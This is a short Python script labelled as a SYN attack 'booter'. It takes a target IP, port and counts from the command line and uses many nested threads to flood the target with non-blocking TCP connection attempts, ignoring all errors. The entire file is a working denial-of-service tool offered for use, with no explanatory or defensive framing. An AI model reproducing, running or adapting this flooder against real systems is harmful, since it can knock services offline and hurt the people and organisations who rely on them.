import socket,sys,threading

def SYN_ATTACK(ip,port,booter):
    try:
        for _ in range(booter):
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.setblocking(0)
            s.connect((ip,port))
            s.connect_ex((ip,port))
    except:
       pass

def RUNNING_SYN(ip,port,time,booter):
    for _ in range(time):
       threading.Thread(target=SYN_ATTACK,args=(ip,port,booter)).start()

IP = ''
PORT =0
TIME = 0
BOOTER = 0

if len(sys.argv) == 5:
    IP = str(sys.argv[1])
    PORT = int(sys.argv[2])
    TIME = int(sys.argv[3])
    BOOTER = int(sys.argv[4])
else:
    exit()

for _ in range(50):
 threading.Thread(target=RUNNING_SYN,args=(IP,PORT,TIME,BOOTER)).start()